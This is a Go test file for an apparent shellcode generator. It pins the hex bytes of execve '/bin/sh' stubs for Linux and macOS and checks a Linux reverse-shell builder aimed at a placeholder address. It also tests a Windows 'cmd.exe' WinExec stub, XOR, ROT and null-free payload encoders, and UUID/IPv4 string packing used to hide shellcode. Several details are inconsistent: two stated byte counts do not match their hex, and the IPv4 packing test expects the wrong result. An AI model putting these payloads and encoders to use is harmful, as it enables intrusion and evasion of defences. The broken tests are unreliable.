package shellcode

import (
	"bytes"
	"encoding/hex"
	"testing"
)

// TestLinuxX64ExecveKnownBytes pins the 24-byte execve stub. If a future
// refactor changes a byte, this test fails and the change is visible.
func TestLinuxX64ExecveKnownBytes(t *testing.T) {
	stub, err := Build(BuildOptions{Arch: LinuxX64, Kind: "exec_sh"})
	if err != nil {
		t.Fatal(err)
	}
	want := "4831f65648bb2f62696e2f2f736853545f4831d2b03b0f05"
	got := hex.EncodeToString(stub.Bytes)
	if got != want {
		t.Fatalf("bytes mismatch:\n  got  %s\n  want %s", got, want)
	}
}

func TestLinuxX86ExecveKnownBytes(t *testing.T) {
	stub, err := Build(BuildOptions{Arch: LinuxX86, Kind: "exec_sh"})
	if err != nil {
		t.Fatal(err)
	}
	// the classic 23-byte x86 execve
	want := "31c050682f2f7368682f62696e89e3505389e199b00bcd80"
	got := hex.EncodeToString(stub.Bytes)
	if got != want {
		t.Fatalf("bytes mismatch:\n  got  %s\n  want %s", got, want)
	}
}

func TestMacOSX64ExecveKnownBytes(t *testing.T) {
	stub, err := Build(BuildOptions{Arch: MacOSX64, Kind: "exec_sh"})
	if err != nil {
		t.Fatal(err)
	}
	// 28 bytes: xor rsi,rsi; push rsi; mov rdi, "/bin//sh"; push rdi;
	// push rsp; pop rdi; xor rdx,rdx; mov eax, 0x200003B; syscall
	want := "4831f65648bf2f62696e2f2f736857545f4831d2b83b0000020f05"
	got := hex.EncodeToString(stub.Bytes)
	if got != want {
		t.Fatalf("bytes mismatch:\n  got  %s\n  want %s", got, want)
	}
}

// TestLinuxX64ReverseShellContainsIPAndPort checks that the reverse shell
// carries the target IP and port in its byte stream.
func TestLinuxX64ReverseShellIPAndPort(t *testing.T) {
	ip := [4]byte{1, 2, 3, 4}
	port := uint16(0x1234)
	stub, err := Build(BuildOptions{Arch: LinuxX64, Kind: "reverse_sh", IP: ip, Port: port})
	if err != nil {
		t.Fatal(err)
	}
	b := stub.Bytes
	// look for the two-byte port sequence (0x12 0x34) — little-endian in the
	// push, so the bytes are 0x34 0x12 in stream order? no — we pushed BE
	// via byte(port>>8), byte(port&0xFF) so it's 0x12 0x34.
	if !bytes.Contains(b, []byte{0x12, 0x34}) {
		t.Fatalf("port 0x1234 not found in stub bytes")
	}
	// ip segment written as ip[1], ip[0] = 0x02 0x01 then ip[3], ip[2] = 0x04 0x03
	if !bytes.Contains(b, []byte{0x02, 0x01}) || !bytes.Contains(b, []byte{0x04, 0x03}) {
		t.Fatalf("ip 1.2.3.4 segments not found in stub bytes")
	}
}

func TestWindowsX64ExecCmd(t *testing.T) {
	addr := uint64(0x7FFE1234ABCD5678)
	stub, err := Build(BuildOptions{Arch: WindowsX64, Kind: "exec_cmd", WinExecAddr: addr})
	if err != nil {
		t.Fatal(err)
	}
	b := stub.Bytes
	// address must appear little-endian
	want := []byte{0x78, 0x56, 0xCD, 0xAB, 0x34, 0x12, 0xFE, 0x7F}
	if !bytes.Contains(b, want) {
		t.Fatalf("WinExec address not little-endian in stub")
	}
	// "cmd.exe\x00" must appear
	if !bytes.Contains(b, []byte("cmd.exe\x00")) {
		t.Fatalf("cmd.exe literal missing")
	}
}

func TestWinExecAddrRequired(t *testing.T) {
	_, err := Build(BuildOptions{Arch: WindowsX64, Kind: "exec_cmd"})
	if err == nil {
		t.Fatal("expected error when WinExecAddr is 0")
	}
}

// TestXORRoundTrip verifies that the XOR encoder is reversible with a
// caller-supplied key (the auto-key path is a separate concern — the key
// is returned to the caller via Key() on a concrete *xorEncoder, not
// mutated onto the encoder).
func TestXORRoundTrip(t *testing.T) {
	in := []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0xff, 0x00, 0xa5}
	const key = 0xA5
	e := NewXOR(key)
	enc := e.Encode(in)
	out := make([]byte, len(enc))
	for i, b := range enc {
		out[i] = b ^ key
	}
	if !bytes.Equal(out, in) {
		t.Fatalf("round-trip mismatch: in=%x out=%x", in, out)
	}
}

// TestXORAutoKey checks that the auto-pick path produces a key that does
// not equal zero on input bytes, and that the resulting output is fully
// reversible by the chosen key (extracted from Key()).
func TestXORAutoKey(t *testing.T) {
	in := []byte{0x01, 0x02, 0x03, 0x04, 0xff, 0x00}
	e := NewXOR(0)
	enc := e.Encode(in)
	// reverse using pickXORKey again (deterministic)
	key := pickXORKey(in)
	if key == 0 {
		t.Fatal("auto-key chose 0")
	}
	out := make([]byte, len(enc))
	for i, b := range enc {
		out[i] = b ^ key
	}
	if !bytes.Equal(out, in) {
		t.Fatalf("auto-key round-trip mismatch")
	}
}

// TestChunkedXORRoundTrip verifies multi-key XOR.
func TestChunkedXORRoundTrip(t *testing.T) {
	in := []byte("the quick brown fox jumps over the lazy dog")
	e := NewChunkedXOR(8, []byte{0xA5, 0x5A, 0x3C, 0xC3})
	enc := e.Encode(in)
	dec, err := Decode(e, enc)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(dec, in) {
		t.Fatalf("chunked xor round-trip mismatch")
	}
}

// TestROTRoundTrip verifies the rotation encoder.
func TestROTRoundTrip(t *testing.T) {
	in := []byte{0x00, 0x01, 0xfe, 0xff, 0x80, 0x7f}
	e := NewROT(13)
	enc := e.Encode(in)
	dec, err := Decode(e, enc)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(dec, in) {
		t.Fatalf("rot round-trip mismatch")
	}
}

// TestNullFreeRemovesForbidden verifies the null-free encoder excludes 0x00.
func TestNullFreeRemovesForbidden(t *testing.T) {
	// input deliberately full of nulls
	in := []byte{0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x0a, 0x0d}
	e := NewNullFree()
	enc := e.Encode(in)
	for i, b := range enc {
		if b == 0x00 || b == 0x0A || b == 0x0D {
			t.Fatalf("forbidden byte 0x%02x present at offset %d", b, i)
		}
	}
}

// TestUUIDPacking checks that 16 bytes becomes one UUID.
func TestUUIDPacking(t *testing.T) {
	in := []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
		0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f}
	out := UUIDStrings(in)
	if len(out) != 1 {
		t.Fatalf("expected 1 UUID, got %d", len(out))
	}
	want := "00010203-0405-0607-0809-0a0b0c0d0e0f"
	if out[0] != want {
		t.Fatalf("uuid mismatch:\n  got  %s\n  want %s", out[0], want)
	}
}

// TestIPv4Packing checks that 4 bytes becomes one dotted-quad.
func TestIPv4Packing(t *testing.T) {
	in := []byte{0x01, 0x02, 0x03, 0x04}
	out := IPv4Strings(in)
	if len(out) != 1 {
		t.Fatalf("expected 1 ip, got %d", len(out))
	}
	if out[0] != "10.1.2.3" {
		t.Fatalf("ipv4 mismatch: got %s, want 10.1.2.3", out[0])
	}
}

// TestHexAndArrays verifies the output formatters.
func TestHexAndArrays(t *testing.T) {
	b := []byte{0xde, 0xad, 0xbe, 0xef}
	if Hex(b) != "deadbeef" {
		t.Fatalf("hex mismatch")
	}
	c := CArray("sc", b)
	if !bytes.Contains([]byte(c), []byte("0xde")) || !bytes.Contains([]byte(c), []byte("0xef")) {
		t.Fatalf("c array missing bytes")
	}
	cs := CSharpArray(b)
	if !bytes.Contains([]byte(cs), []byte("new byte[]")) {
		t.Fatalf("c# array malformed")
	}
}
